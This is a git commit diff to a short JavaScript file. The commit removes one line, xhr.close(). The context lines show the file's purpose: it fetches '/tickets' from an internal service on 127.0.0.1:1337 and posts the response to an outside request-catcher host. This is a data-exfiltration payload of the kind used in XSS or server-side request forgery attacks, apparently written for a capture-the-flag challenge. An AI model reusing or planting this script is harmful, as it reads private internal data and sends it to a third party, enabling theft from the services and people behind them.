6eb016082c77cb3c799788dc74fba9d7ca3d5020
UnlikeLemon <83449816+UnlikeLemon@users.noreply.github.com>
2021-10-23 10:20:48 -0700

    Update js_script.js

--- js_script.js
+++ js_script.js
@@ -2,7 +2,6 @@ var xhr = new XMLHttpRequest();
 xhr.open("GET", "http://127.0.0.1:1337/tickets",true);
 xhr.send();
 v = xhr.responseText;
-xhr.close();
 
 xhr.open("POST", "https://lemon.requestcatcher.com/", true);
 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
